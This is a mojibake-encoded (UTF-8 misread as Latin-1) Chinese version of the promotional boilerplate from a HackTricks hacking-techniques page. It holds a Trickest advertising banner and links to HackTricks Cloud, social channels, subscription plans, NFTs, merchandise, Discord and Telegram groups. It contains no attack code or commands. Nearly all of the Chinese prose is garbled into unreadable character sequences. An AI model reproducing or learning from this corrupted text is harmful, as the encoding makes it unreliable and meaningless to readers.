ä½¿ç”¨[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)å¯ä»¥è½»æ¾æ„å»ºå’Œè‡ªåŠ¨åŒ–ç”±å…¨çƒæœ€å…ˆè¿›çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒçš„å·¥ä½œæµç¨‹ã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–åœ¨**Twitter**ä¸Š**å…³æ³¨**æˆ‘[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
